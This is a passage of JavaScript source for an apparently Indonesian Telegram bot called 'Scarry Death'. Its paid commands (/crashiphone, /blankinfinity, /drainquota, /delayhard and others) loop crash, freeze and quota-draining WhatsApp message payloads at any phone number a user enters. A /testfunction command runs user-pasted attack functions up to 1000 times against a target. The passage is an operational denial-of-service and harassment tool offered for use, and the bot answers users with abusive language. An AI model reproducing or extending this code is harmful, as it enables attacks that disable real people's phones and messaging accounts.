    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    // kirim bug
    for (let i = 0; i < 15; i++) {
      await Blankv3raraa(jid);
      await Blankv4raraa(jid);
      await Blankv5raraa(jid);
      await Blankv1raraa(jid);
      await Blankv2raraa(jid);
      await Blankv3raraa(jid);
      await Blankv4raraa(jid);
      await Blankv5raraa(jid);
      await Blankdocu(jid);  
      await sleep(12000);
      console.log(
        chalk.red(`[SCARRY] BUG Processing ${count}/30 Loop ke ${formattedNumber}`)
      );
      count++;
    }

console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // caption success
    const successCaption = `<pre>${escapeHtml(
`SCARRY SUCCES BUG✅️
Target : ${formattedNumber}
Type Bug : Blank InfinityV2
Status : Success
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

await bot.editMessageCaption(successCaption, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/crashiphone (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kontol! ${cooldown} .`);
  }

  // ===== CEK PREMIUM =====
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    const deniedCaption = `<pre>${escapeHtml(
      "⚠️ Akses Ditolak\nAnda tidak memiliki akses premium untuk menggunakan command ini."
    )}</pre>`;

    return bot.sendPhoto(chatId, randomImage, {
      caption: deniedCaption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Developer",
              url: "https://t.me/raraa_imuppp",
            },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // caption awal (proses)
    const processCaption = `<pre>${escapeHtml(
`SCARRY SENDING BUG ⚡️
Target : ${formattedNumber}
Type Bug : Crash iPhone
Status : Process
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://qu.ax/rkgho.jpg",
      {
        caption: processCaption,
        parse_mode: "HTML",
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    // kirim bug
    for (let i = 0; i < 30; i++) {
      await FreezeFileInvis(jid);
      await iosFreeze(jid);
      await sleep(7000);
      console.log(
        chalk.red(`[SCARRY] BUG Processing ${count}/30 Loop ke ${formattedNumber}`)
      );
      count++;
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // caption success
    const successCaption = `<pre>${escapeHtml(
`SCARRY SUCCES BUG✅️
Target : ${formattedNumber}
Type Bug : Crash iPhone
Status : Success
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    await bot.editMessageCaption(successCaption, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/uimention (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  // 🕒 Cek cooldown
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kontol! ${cooldown} .`);
  }

  // 💎 Cek Premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    const deniedCaption = `<pre>${escapeHtml(
      "⚠️ Akses Ditolak\nAnda tidak memiliki akses premium untuk menggunakan command ini."
    )}</pre>`;

    return bot.sendPhoto(chatId, randomImage, {
      caption: deniedCaption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Owner",
              url: "https://t.me/raraa_imuppp",
            },
          ],
        ],
      },
    });
  }

  try {
    // 🔌 Pastikan ada sesi aktif
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // 📨 Caption awal
    const processCaption = `<pre>${escapeHtml(
`SCARRY SENDING BUG ⚡️
Target : ${formattedNumber}
Type Bug : Ui Mention
Status : Process
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://qu.ax/rkgho.jpg",
      {
        caption: processCaption,
        parse_mode: "HTML",
      }
    );

    // 🚀 Proses pengiriman bug
    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    for (let i = 0; i < 15; i++) {
      await Blankv3raraa(jid);
      await Blankv4raraa(jid);
      await Blankv1raraa(jid);
      await Blankv2raraa(jid);
      await Blankv3raraa(jid);
      await Blankv4raraa(jid);
      await Blankdocu(jid);
      await sleep(11000);
      console.log(
        chalk.red(`[SCARRY] BUG Processing ${count}/5 Loop ke ${formattedNumber}`)
      );
      count++;
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // ✅ Caption sukses
    const successCaption = `<pre>${escapeHtml(
`SCARRY SUCCES BUG✅️
Target : ${formattedNumber}
Type Bug : Ui Mention
Status : Success
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    await bot.editMessageCaption(successCaption, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/blankinfinity (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kontol! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    const captionPremium = `<pre>${escapeHtml(
      "⚠️ Akses Ditolak\nAnda tidak akses premium untuk menggunakan command ini."
    )}</pre>`;

    return bot.sendPhoto(chatId, randomImage, {
      caption: captionPremium,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Owner",
              url: "https://t.me/raraa_imuppp",
            },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }
    const initialCaption = `<pre>${escapeHtml(
`SCARRY SENDING BUG ⚡️
Target : ${formattedNumber}
Type Bug : Blank Infinity
Status : Procces
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://qu.ax/rkgho.jpg",
      {
        caption: initialCaption,
        parse_mode: "HTML",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 5; i++) { 
      await Blankv3raraa(jid);
      await Blankv4raraa(jid);
      await Blankv5raraa(jid);
      await Blankv1raraa(jid);
      await Blankv2raraa(jid);
      await Blankv3raraa(jid);
      await Blankv4raraa(jid);
      await Blankv5raraa(jid);
      await Blankdocu(jid);
      await sleep(10000);
      console.log(
        chalk.red(
          `[SCARRY] BUG Processing ${count}/30 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    const successCaption = `<pre>${escapeHtml(
`SCARRY SUCCES BUG✅️
Target : ${formattedNumber}
Type Bug : Blank Infinity
Status : Success
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    await bot.editMessageCaption(successCaption, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/comboall (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kontol! ${cooldown} .`);
  }

  // ===== CEK PREMIUM =====
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    const deniedCaption = `<pre>${escapeHtml(
      "⚠️ Akses Ditolak\nAnda tidak memiliki akses premium untuk menggunakan command ini."
    )}</pre>`;

return bot.sendPhoto(chatId, randomImage, {
      caption: deniedCaption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Developer",
              url: "https://t.me/raraa_imuppp",
            },
          ],
        ],
      },
    });
  }

try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

   // caption awal (proses)
    const processCaption = `<pre>${escapeHtml(
`SCARRY SENDING BUG ⚡️
Target : ${formattedNumber}
Type Bug : Combo All Bugs
Status : Process
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://qu.ax/rkgho.jpg",
      {
        caption: processCaption,
        parse_mode: "HTML",
      }
    );

let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    // kirim bug
    for (let i = 0; i < 5; i++) {
      await LocX(jid); 
      await Ati(jid); 
      await tititgwgede(jid);    
      await Blankv3raraa(jid);
      await Blankv4raraa(jid);
      await Blankv5raraa(jid);
      await Blankv1raraa(jid);
      await Blankv2raraa(jid);
      await Blankv3raraa(jid);
      await Blankv4raraa(jid);
      await Blankv5raraa(jid);
      await Blankdocu(jid);
      await storyOfMyLive(jid);
      await delay2(jid);  
      await sleep(10000);
      console.log(
        chalk.red(`[SCARRY] BUG Processing ${count}/30 Loop ke ${formattedNumber}`)
      );
      count++;
    }

console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // caption success
    const successCaption = `<pre>${escapeHtml(
`SCARRY SUCCES BUG✅️
Target : ${formattedNumber}
Type Bug : Combo All Bugs
Status : Success
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

await bot.editMessageCaption(successCaption, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/crashhome (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kontol! ${cooldown} .`);
  }

  // ===== CEK PREMIUM =====
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    const deniedCaption = `<pre>${escapeHtml(
      "⚠️ Akses Ditolak\nAnda tidak memiliki akses premium untuk menggunakan command ini."
    )}</pre>`;

return bot.sendPhoto(chatId, randomImage, {
      caption: deniedCaption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Developer",
              url: "https://t.me/raraa_imuppp",
            },
          ],
        ],
      },
    });
  }

try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

   // caption awal (proses)
    const processCaption = `<pre>${escapeHtml(
`SCARRY SENDING BUG ⚡️
Target : ${formattedNumber}
Type Bug : Crash Home
Status : Process
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://qu.ax/rkgho.jpg",
      {
        caption: processCaption,
        parse_mode: "HTML",
      }
    );

let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    // kirim bug
    for (let i = 0; i < 15; i++) {
      await Blankv3raraa(jid);
      await Blankv4raraa(jid);
      await Blankv5raraa(jid);
      await Blankv1raraa(jid);
      await Blankv2raraa(jid);
      await Blankv3raraa(jid);
      await Blankv4raraa(jid);
      await Blankv5raraa(jid);
      await Blankdocu(jid);
      await sleep(15000);
      console.log(
        chalk.red(`[SCARRY] BUG Processing ${count}/30 Loop ke ${formattedNumber}`)
      );
      count++;
    }

console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // caption success
    const successCaption = `<pre>${escapeHtml(
`SCARRY SUCCES BUG✅️
Target : ${formattedNumber}
Type Bug : Crash Home
Status : Success
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

await bot.editMessageCaption(successCaption, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/testfunction (\d+)(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  try {
    const targetNumber = match[1];
    const jumlah = Math.min(parseInt(match[2]) || 1, 1000);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    // === cek cooldown ===
    const cd = checkCooldown(senderId, 5000);
    if (cd) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cd} detik sebelum pakai lagi.`, {
        reply_to_message_id: msg.message_id,
      });
    }

    // === cek reply function ===
    if (!msg.reply_to_message || !msg.reply_to_message.text) {
      return bot.sendMessage(chatId, "❌ Reply pesan berisi function!", {
        reply_to_message_id: msg.message_id,
      });
    }

    // === kirim status awal ===
    const processCaption = `<pre>${escapeHtml(
`⎧ SCARRY DEATH ⎭
⌑ Target: ${formattedNumber}
⌑ Type: Unknown Function
⌑ Status: Process`
    )}</pre>`;

    const processMsg = await bot.sendPhoto(chatId, getRandomImage(), {
      caption: processCaption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔍 Cek Target", url:`https://wa.me/${formattedNumber}`}],
        ],
      },
    });

    // === eksekusi function dari reply ===
    const funcCode = msg.reply_to_message.text;
    const matchFunc = funcCode.match(/async function\s+(\w+)/);
    if (!matchFunc) {
      return bot.sendMessage(chatId, "❌ Function tidak valid.");
    }

    const funcName = matchFunc[1];
    const sandbox = {
      console,
      Buffer,
      sock,
      target: jid,
      sleep,
      generateWAMessageFromContent,
      generateForwardMessageContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser,
    };
    const context = vm.createContext(sandbox);
    const wrapper = `${funcCode}\n${funcName}`;
    const fn = vm.runInContext(wrapper, context);

    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) {
          await fn(jid);
        } else if (arity === 2) {
          await fn(sock, jid);
        } else {
          await fn(sock, jid, true);
        }
      } catch (err) {
        console.error("Err loop:", err.message);
      }
      await sleep(200);
    }

    // === update status selesai ===
    const successCaption = `<pre>${escapeHtml(
`⎧ SCARRY DEATH ⎭
⌑ Target: ${formattedNumber}
⌑ Type: Unknown Function
⌑ Status: Success`
    )}</pre>`;

    await bot.editMessageCaption(successCaption, {
      chat_id: chatId,
      message_id: processMsg.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜📱⌟ ☇ Cek Target", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    });
  } catch (err) {
    console.error("Error /testfunction:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan internal.", {
      reply_to_message_id: msg.message_id,
    });
  }
});

bot.onText(/\/drainquota (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  // 🕒 Cek cooldown
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kontol! ${cooldown}` );
  }

  // 💎 Cek Premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    const deniedCaption = `<pre>${escapeHtml(
      "⚠️ Akses Ditolak\nAnda tidak memiliki akses premium untuk menggunakan command ini."
    )}</pre>`;

    return bot.sendPhoto(chatId, randomImage, {
      caption: deniedCaption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Owner", url: "https://t.me/raraa_imuppp" }],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // 📨 Caption awal
    const processCaption = `<pre>${escapeHtml(
`SCARRY SENDING BUG ⚡️
Target : ${formattedNumber}
Type Bug : Bulldozer Kouta
Status : Process
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://qu.ax/rkgho.jpg",
      {
        caption: processCaption,
        parse_mode: "HTML",
      }
    );

    // 🚀 Proses kirim bug
    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    for (let i = 0; i < 30; i++) {
      await DelayDrainXyr(jid); 
      await LocX(jid); 
      await tititgwgede(jid); 
      await sleep(12000);
      console.log(
        chalk.red(`[SCARRY] BUG Processing ${count}/75 Loop ke ${formattedNumber}`)
      );
      count++;
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // ✅ Caption success
    const successCaption = `<pre>${escapeHtml(
`SCARRY SUCCES BUG✅️
Target : ${formattedNumber}
Type Bug : Bulldozer Kouta
Status : Success
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    await bot.editMessageCaption(successCaption, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/delayhard (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0)
    return bot.sendMessage(chatId, `Jeda dulu ya kontol! ${cooldown} .`);

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    const denied = `<pre>${escapeHtml(
`⚠️ Akses Ditolak
Anda tidak memiliki akses premium untuk menggunakan command ini.`
    )}</pre>`;

    return bot.sendPhoto(chatId, randomImage, {
      caption: denied,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Owner", url: "https://t.me/raraa_imuppp" }]],
      },
    });
  }

  try {
    if (sessions.size === 0)
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );

    const processCaption = `<pre>${escapeHtml(
`SCARRY SENDING BUG ⚡️
ク Target : ${formattedNumber}
ク Type Bug : Delay Hard
ク Status : Proces
ク Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://qu.ax/rkgho.jpg",
      { caption: processCaption, parse_mode: "HTML" }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    for (let i = 0; i < 15; i++) {
      await LocX(jid); 
      await Ati(jid); 
      await tititgwgede(jid);    
      await storyOfMyLive(jid);
      await delay2(jid);
      await sleep(10000);
      console.log(
        chalk.red(`[SCARRY] BUG Processing ${count}/2 Loop ke ${formattedNumber}`)
      );
      count++;
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    const successCaption = `<pre>${escapeHtml(
`SCARRY SUCCES BUG✅️
ク Target : ${formattedNumber}
ク Type Bug : Delay Hard
ク Status : Success
ク Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    await bot.editMessageCaption(successCaption, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/delaymention (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0)
    return bot.sendMessage(chatId, `Jeda dulu ya kontol! ${cooldown} .`);

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    const denied = `<pre>${escapeHtml(
`⚠️ Akses Ditolak
Anda tidak memiliki akses premium untuk menggunakan command ini.`
    )}</pre>`;

    return bot.sendPhoto(chatId, randomImage, {
      caption: denied,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Owner", url: "https://t.me/raraa_imuppp" }]],
      },
    });
  }

  try {
    if (sessions.size === 0)
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );

    const processCaption = `<pre>${escapeHtml(
`SCARRY SENDING BUG ⚡️
ク Target : ${formattedNumber}
ク Type Bug : Delay Mention
ク Status : Process
ク Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://qu.ax/rkgho.jpg",
      { caption: processCaption, parse_mode: "HTML" }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    for (let i = 0; i < 15; i++) {
      await LocX(jid); 
      await Ati(jid); 
      await storyOfMyLive(jid);
      await tititgwgede(jid);
      await delay2(jid);
      await sleep(12000);
      console.log(
        chalk.red(`[SCARRY] BUG Processing ${count}/1 Loop ke ${formattedNumber}`)
      );
      count++;
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    const successCaption = `<pre>${escapeHtml(
`SCARRY SUCCES BUG✅️
ク Target : ${formattedNumber}
ク Type Bug : Delay Mention
ク Status : Success
ク Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    await bot.editMessageCaption(successCaption, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/delayfreze (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net;`
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kontol! ${cooldown} .`);
  }

  // ===== CEK PREMIUM =====
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    const deniedCaption = `<pre>${escapeHtml(
      "⚠️ Akses Ditolak\nAnda tidak memiliki akses premium untuk menggunakan command ini."
    )}</pre>`;

return bot.sendPhoto(chatId, randomImage, {
      caption: deniedCaption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Developer",
              url: "https://t.me/raraa_imuppp",
            },
          ],
        ],
      },
    });
  }

try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

   // caption awal (proses)
    const processCaption = `<pre>${escapeHtml(
`SCARRY SENDING BUG ⚡️
Target : ${formattedNumber}
Type Bug : Delay Frezee
Status : Process
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://qu.ax/rkgho.jpg",
      {
        caption: processCaption,
        parse_mode: "HTML",
      }
    );

let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    // kirim bug
    for (let i = 0; i < 15; i++) {
      await LocX(jid); 
      await Ati(jid); 
      await storyOfMyLive(jid);
      await tititgwgede(jid);
      await delay2(jid);
      await sleep(12000);
      console.log(
        chalk.red(`[SCARRY] BUG Processing ${count}/30 Loop ke ${formattedNumber}`)
      );
      count++;
    }

console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // caption success
    const successCaption = `<pre>${escapeHtml(
`SCARRY SUCCES BUG✅️
Target : ${formattedNumber}
Type Bug : Delay Frezee
Status : Success
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

await bot.editMessageCaption(successCaption, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
         [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/invisibletext (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kontol! ${cooldown} .`);
  }

  // ===== CEK PREMIUM =====
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    const deniedCaption = `<pre>${escapeHtml(
      "⚠️ Akses Ditolak\nAnda tidak memiliki akses premium untuk menggunakan command ini."
    )}</pre>`;

return bot.sendPhoto(chatId, randomImage, {
      caption: deniedCaption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
